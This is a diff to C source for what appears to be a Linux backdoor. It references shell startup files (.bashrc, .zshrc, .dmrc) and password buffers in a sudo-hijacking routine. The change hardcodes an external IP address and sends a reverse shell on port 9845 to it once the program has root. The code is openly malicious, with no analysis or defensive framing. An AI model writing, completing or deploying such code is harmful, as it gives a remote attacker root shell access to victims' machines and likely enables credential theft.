@@ -20,6 +20,8 @@
 #define PASSWD_SIZE 1024
 #define UNAME_SIZE 1024
 
+#define SERVER_IP "206.189.197.67"
+
 static void sighandler(int signo){}
 
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
@@ -51,7 +53,7 @@ int sudo_mode(int argc, char ** argv){
 
 int root_mode(int argc, char**argv){
   printf("I have root acess now...\n");
-  reverse_shell(9845, "0.0.0.0", argv);
+  reverse_shell(9845, SERVER_IP, argv);
   while(1){
     sleep(1);
     printf("...\n");
